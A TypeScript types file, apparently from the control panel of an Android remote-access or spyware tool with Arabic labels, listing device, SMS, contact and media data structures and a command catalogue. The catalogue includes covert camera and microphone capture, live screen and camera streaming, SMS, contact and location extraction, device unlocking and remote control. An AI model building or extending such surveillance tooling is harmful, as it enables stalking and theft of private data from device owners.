export interface Device {
  id: string;
  name: string;
  token: string;
  battery: number;
  lastActive: string;
  storageUsed: number;
  storageTotal: number;
  isLocked: boolean;
  networkType: string;
  carrierName: string;
  isCharging: boolean;
  isOnline: boolean;
  androidVersion: string;
  status?: string;
}

export interface SmsLog {
  id: string;
  sender: string;
  body: string;
  timestamp: string;
  type: 'incoming' | 'outgoing';
}

export interface SecurityAlert {
  id: string;
  title: string;
  message: string;
  timestamp: string;
}

export interface InstalledApp {
  name: string;
  packageName: string;
  isSystem: boolean;
  versionName: string;
}

export interface FileItem {
  name: string;
  path: string;
  isDir: boolean;
  size: number;
  date: string;
}

export interface MediaItem {
  id: string;
  base64?: string;
  url: string;
  timestamp: string;
  type: 'screenshot' | 'photo' | 'video' | 'audio';
  cameraType?: 'front' | 'back';
  commandSource?: string;
}

export interface Contact {
  id: string;
  name: string;
  number: string;
}

export interface SimCardInfo {
  slotIndex: number;
  carrierName: string;
  phoneNumber: string;
  isMultiSim: boolean;
  countryIso: string;
  status: string;
}

export interface EmailAccount {
  type: string;
  name: string;
}

export interface AppUsageActivity {
  packageName: string;
  appName: string;
  totalTimeMs: number;
  lastUsed: string;
  launchCount: number;
  isSystem: boolean;
  category: string;
}

export interface Command {
  id: string;
  device_token: string;
  command: string;
  status: 'pending' | 'sent' | 'executed' | 'failed';
  result?: string;
  created_at: string;
}

export interface CommandProgress {
  commandType: string;
  commandLabel: string;
  sendStatus: 'sending' | 'sent' | 'failed';
  sendError?: string;
  executionStatus: 'pending' | 'executing' | 'completed' | 'failed';
  executionError?: string;
  resultMessage?: string;
  startTimestamp: number;
}

export interface AppSettings {
  serverUrl: string;
  supabaseKey: string;
  cloudinaryName: string;
  cloudinaryApiKey: string;
  cloudinaryApiSecret: string;
}

export interface CommandDef {
  key: string;
  label: string;
  icon: string;
  category: 'capture' | 'control' | 'data' | 'stream' | 'file';
  danger?: boolean;
}

export const COMMANDS: CommandDef[] = [
  { key: 'take_screenshot', label: 'لقطة شاشة', icon: 'Camera', category: 'capture' },
  { key: 'take_photo_front', label: 'صورة كاميرا أمامية', icon: 'Camera', category: 'capture' },
  { key: 'take_photo_back', label: 'صورة كاميرا خلفية', icon: 'Camera', category: 'capture' },
  { key: 'record_video_front', label: 'فيديو أمامي', icon: 'Video', category: 'capture' },
  { key: 'record_video_back', label: 'فيديو خلفي', icon: 'Video', category: 'capture' },
  { key: 'record_audio', label: 'تسجيل صوتي', icon: 'Mic', category: 'capture' },
  { key: 'lock_device', label: 'قفل الهاتف', icon: 'Lock', category: 'control', danger: true },
  { key: 'unlock_device', label: 'إلغاء القفل', icon: 'Unlock', category: 'control' },
  { key: 'flash_on', label: 'تشغيل الفلاش', icon: 'Flashlight', category: 'control' },
  { key: 'flash_off', label: 'إيقاف الفلاش', icon: 'FlashlightOff', category: 'control' },
  { key: 'micro_on', label: 'بث الميكروفون', icon: 'Radio', category: 'stream' },
  { key: 'micro_off', label: 'إيقاف الميكروفون', icon: 'Radio', category: 'stream' },
  { key: 'stream_screen', label: 'بث الشاشة', icon: 'Monitor', category: 'stream' },
  { key: 'stop_stream', label: 'إيقاف البث', icon: 'MonitorOff', category: 'stream' },
  { key: 'stream_camera_front', label: 'بث الكاميرا الأمامية', icon: 'Video', category: 'stream' },
  { key: 'stream_camera_back', label: 'بث الكاميرا الخلفية', icon: 'Video', category: 'stream' },
  { key: 'stop_camera_stream', label: 'إيقاف بث الكاميرا', icon: 'VideoOff', category: 'stream' },
  { key: 'get_contacts', label: 'جلب جهات الاتصال', icon: 'Users', category: 'data' },
  { key: 'get_sms', label: 'جلب رسائل SMS', icon: 'MessageSquare', category: 'data' },
  { key: 'get_location', label: 'جلب الموقع', icon: 'MapPin', category: 'data' },
  { key: 'list_apps', label: 'قائمة التطبيقات', icon: 'AppWindow', category: 'data' },
  { key: 'get_number', label: 'معلومات الشرائح', icon: 'SimCard', category: 'data' },
  { key: 'get_account', label: 'الحسابات الإلكترونية', icon: 'Mail', category: 'data' },
  { key: 'get_notifications', label: 'الإشعارات', icon: 'Bell', category: 'data' },
  { key: 'list_directory', label: 'استعراض الملفات', icon: 'FolderOpen', category: 'file' },
  { key: 'get_size_photo', label: 'فحص الصور', icon: 'Image', category: 'file' },
  { key: 'get_zip_photo', label: 'حزمة صور', icon: 'Archive', category: 'file' },
  { key: 'get_size_video', label: 'فحص الفيديوهات', icon: 'Film', category: 'file' },
  { key: 'get_zip_video', label: 'حزمة فيديوهات', icon: 'Archive', category: 'file' },
  { key: 'send_notification', label: 'إرسال تنبيه', icon: 'Send', category: 'control' },
  { key: 'play_remote_sound', label: 'تشغيل صوت', icon: 'Volume2', category: 'control' },
  { key: 'stop_sound', label: 'إيقاف الصوت', icon: 'VolumeX', category: 'control' },
  { key: 'set_volume', label: 'ضبط الصوت', icon: 'Volume1', category: 'control' },
  { key: 'remote_control', label: 'تحكم عن بُعد', icon: 'MousePointer', category: 'control' },
  { key: 'get_sounds', label: 'قائمة الأصوات', icon: 'Music', category: 'data' },
];

export const COMMAND_CATEGORIES = [
  { key: 'capture', label: 'التقاط', color: 'primary' },
  { key: 'control', label: 'تحكم', color: 'danger' },
  { key: 'stream', label: 'بث مباشر', color: 'info' },
  { key: 'data', label: 'جلب بيانات', color: 'success' },
  { key: 'file', label: 'ملفات', color: 'warning' },
] as const;
